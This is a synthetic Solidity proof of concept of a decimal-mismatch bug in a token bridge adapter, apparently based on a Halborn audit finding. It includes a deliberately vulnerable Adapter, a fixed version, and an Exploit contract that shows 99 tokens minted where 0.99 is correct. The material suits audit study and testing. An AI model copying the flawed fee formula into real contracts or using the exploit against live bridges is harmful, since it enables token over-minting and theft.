// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  RuneMine Solana adapter Bridge — fee and amountWithoutFee are taken from the
    raw integer. Token decimals are not in the formula (Halborn):
        fee = amount * feePercent / 1_000
        amountWithoutFee = amount - fee
    SYNTHETIC, cheatcode-free.
    Source amount is 1 token at 8 decimals (100_000_000). Destination token
    has 6 decimals. feePercent is 10 (1%). The buggy payout is 99_000_000
    base units (99 destination tokens). The control scales 8 -> 6 first and
    pays 990_000 (0.99 tokens). Excess minted: 98_010_000. */

contract Dest {
    string public symbol = "RUNE";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Harm {
    string public symbol = "EXCESS";
    uint8 public decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Recipient {}

contract Adapter {
    uint256 public constant FEE_PERCENT = 10;
    uint8 public constant SRC_DECIMALS = 8;
    uint8 public constant DST_DECIMALS = 6;
    Dest public dest;

    constructor(address _dest) {
        dest = Dest(_dest);
    }

    function bridge(address to, uint256 amount) external returns (uint256 fee, uint256 amountWithoutFee) {
        // @> VULN: fee = rawAmount * feePercent / 1000; decimals are not in the formula
        fee = amount * FEE_PERCENT / 1000;
        amountWithoutFee = amount - fee;
        dest.mint(to, amountWithoutFee);
    }
}

contract FixedAdapter {
    uint256 public constant FEE_PERCENT = 10;
    uint8 public constant SRC_DECIMALS = 8;
    uint8 public constant DST_DECIMALS = 6;
    Dest public dest;

    constructor(address _dest) {
        dest = Dest(_dest);
    }

    function bridge(address to, uint256 amount) external returns (uint256 fee, uint256 amountWithoutFee) {
        uint256 scale = 10 ** (SRC_DECIMALS - DST_DECIMALS);
        uint256 normalized = amount / scale;
        fee = normalized * FEE_PERCENT / 1000;
        amountWithoutFee = normalized - fee;
        dest.mint(to, amountWithoutFee);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 100_000_000;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Harm public harm;
    Dest public dest;
    Adapter public buggy;
    FixedAdapter public fixedAdapter;
    Recipient public user;
    Recipient public controlUser;

    uint256 public buggyFee;
    uint256 public buggyOut;
    uint256 public controlOut;
    uint256 public excess;

    constructor() {
        harm = new Harm();
        dest = new Dest();
        buggy = new Adapter(address(dest));
        fixedAdapter = new FixedAdapter(address(dest));
        user = new Recipient();
        controlUser = new Recipient();
    }

    function run() external {
        require(dest.decimals() == 6, "dst");
        require(buggy.SRC_DECIMALS() == 8, "src");
        (buggyFee, buggyOut) = buggy.bridge(address(user), AMOUNT);
        require(buggyFee == 1_000_000, "fee");
        require(buggyOut == 99_000_000, "out");
        require(dest.balanceOf(address(user)) == 99_000_000, "user");
        (, controlOut) = fixedAdapter.bridge(address(controlUser), AMOUNT);
        require(controlOut == 990_000, "control");
        require(dest.balanceOf(address(controlUser)) == 990_000, "control user");
        excess = buggyOut - controlOut;
        require(excess == 98_010_000, "excess");
        harm.mint(SINK, excess);
        require(harm.balanceOf(SINK) == 98_010_000, "marked");
    }
}
